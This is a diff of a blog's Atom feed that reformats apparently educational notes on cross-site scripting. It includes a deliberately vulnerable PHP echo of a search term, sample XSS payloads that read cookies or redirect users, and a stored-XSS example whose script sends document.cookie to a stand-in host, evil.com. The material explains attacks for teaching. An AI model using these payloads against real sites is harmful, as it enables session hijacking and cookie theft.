@@ -4,21 +4,21 @@
     <title> • Posts by &#34;software security&#34; tag</title>
     <link href="http://example.com" />
     <updated>2024-10-30T12:31:43.000Z</updated>
+    <category term="Blog" />
+    <category term="日常" />
     <category term="C language" />
     <category term="Linux" />
     <category term="software security" />
-    <category term="C" />
-    <category term="AFL" />
-    <category term="vulnerability" />
     <category term="HTTP" />
     <category term="XSS" />
     <category term="CSRF" />
+    <category term="C" />
+    <category term="AFL" />
+    <category term="vulnerability" />
     <category term="SQL" />
     <category term="OSI" />
-    <category term="gdb" />
     <category term="JavaScript" />
-    <category term="Blog" />
-    <category term="日常" />
+    <category term="gdb" />
     <entry>
         <id>http://example.com/course/Cross-Site-attack/</id>
         <title>Cross-Site attack</title>
@@ -50,19 +50,28 @@ Classic mistake in a server-side application with URL  &lt;code&gt;http://naive.
 PHP at search.php responds with&lt;/li&gt;
 &lt;/ol&gt;
 &lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&amp;lt;title&amp;gt;Search results&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   You have searched for &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;lt;?php echo $_GET[&amp;#x27;term&amp;#x27;] ?&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ...  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;在这里， &lt;code&gt;$_GET[&#39;term&#39;]&lt;/code&gt;  的内容直接被嵌入到 HTML 中进行回显。如果  &lt;code&gt;$_GET[&#39;term&#39;]&lt;/code&gt;  包含恶意的 HTML 或 JavaScript 代码，则可能引发跨站脚本攻击 (XSS)。&lt;br&gt;
-3. Dangerous HTML Inputs&lt;br&gt;
- &lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Boo!&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
- 此代码弹出一个警告对话框，证明 XSS 攻击是可能的。&lt;br&gt;
- &lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
- 此代码会打印当前页面的 Cookie 信息，攻击者可能会窃取用户的会话 Cookie，从而劫持会话。&lt;br&gt;
- &lt;code&gt;&amp;lt;script&amp;gt;document.write(&amp;quot;&amp;lt;br&amp;gt;&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
- 此代码会在页面中添加一个  &lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt;  标签，显示攻击者可以更改网页内容。&lt;br&gt;
- &lt;code&gt;&amp;lt;script&amp;gt;window.location=&#39;http://google.com&#39;&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
- 此代码会将当前网页重定向到另一个页面，使得攻击者可以将用户导向恶意站点&lt;br&gt;
- 4. Main Types of Cross-Site Scripting Attacks&lt;br&gt;
-1.  Stored (persistent)&lt;br&gt;
-2.  Reflected (non-persistent)&lt;/p&gt;
+&lt;p&gt;在这里， &lt;code&gt;$_GET[&#39;term&#39;]&lt;/code&gt;  的内容直接被嵌入到 HTML 中进行回显。如果  &lt;code&gt;$_GET[&#39;term&#39;]&lt;/code&gt;  包含恶意的 HTML 或 JavaScript 代码，则可能引发跨站脚本攻击 (XSS)。&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;Dangerous HTML Inputs&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Boo!&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
+ 此代码弹出一个警告对话框，证明 XSS 攻击是可能的。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
+ 此代码会打印当前页面的 Cookie 信息，攻击者可能会窃取用户的会话 Cookie，从而劫持会话。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;document.write(&amp;quot;&amp;lt;br&amp;gt;&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
+ 此代码会在页面中添加一个  &lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt;  标签，显示攻击者可以更改网页内容。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;window.location=&#39;http://google.com&#39;&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
+ 此代码会将当前网页重定向到另一个页面，使得攻击者可以将用户导向恶意站点&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;Main Types of Cross-Site Scripting Attacks
+&lt;ol&gt;
+&lt;li&gt;Stored (persistent)&lt;/li&gt;
+&lt;li&gt;Reflected (non-persistent)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
 &lt;h2 id=&#34;Stored (Persistent) XSS Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Stored (Persistent) XSS Attacks&#34;&gt;#&lt;/a&gt;Stored (Persistent) XSS Attacks&lt;/h2&gt;
 &lt;ol&gt;
 &lt;li&gt;Data supplied by an attacker is &lt;strong&gt;permanently stored&lt;/strong&gt; on a server and displayed to other users when browsing without being properly sanitised&lt;br&gt;
@@ -128,10 +137,13 @@ If the user input is displayed in the page
 &lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;HTML&lt;/span&gt;&amp;gt;&lt;/span&gt;Hello, dear &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;win.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://evil.com/steal.cgi?cookie=&amp;#x27;&lt;/span&gt; + &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;cookie&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;. Welcome!&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;HTML&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;由于未对输入进行过滤，浏览器将  &lt;code&gt;script&lt;/code&gt;  标签作为普通的 JavaScript 代码执行。&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;结果&lt;br&gt;
-浏览器执行了恶意 JavaScript 代码，打开了一个新的窗口并向  &lt;code&gt;evil.com/steal.cgi&lt;/code&gt;  发送了用户的  &lt;code&gt;cookie&lt;/code&gt;  信息。&lt;br&gt;
-攻击者通过这种方式获取了受害者的敏感信息（例如身份验证 cookie），并可能进一步进行会话劫持。&lt;br&gt;
-违反同源策略（SOP）：同源策略（Same-Origin Policy）旨在保护用户的浏览器不被恶意脚本跨站攻击，XSS 攻击直接违反了这一策略&lt;/li&gt;
+&lt;li&gt;结果
+&lt;ul&gt;
+&lt;li&gt;浏览器执行了恶意 JavaScript 代码，打开了一个新的窗口并向  &lt;code&gt;evil.com/steal.cgi&lt;/code&gt;  发送了用户的  &lt;code&gt;cookie&lt;/code&gt;  信息。&lt;/li&gt;
+&lt;li&gt;攻击者通过这种方式获取了受害者的敏感信息（例如身份验证 cookie），并可能进一步进行会话劫持。&lt;/li&gt;
+&lt;li&gt;违反同源策略（SOP）：同源策略（Same-Origin Policy）旨在保护用户的浏览器不被恶意脚本跨站攻击，XSS 攻击直接违反了这一策略&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
 &lt;/ul&gt;
 &lt;ol start=&#34;3&#34;&gt;
 &lt;li&gt;Reflected XSS Attack Details&lt;/li&gt;
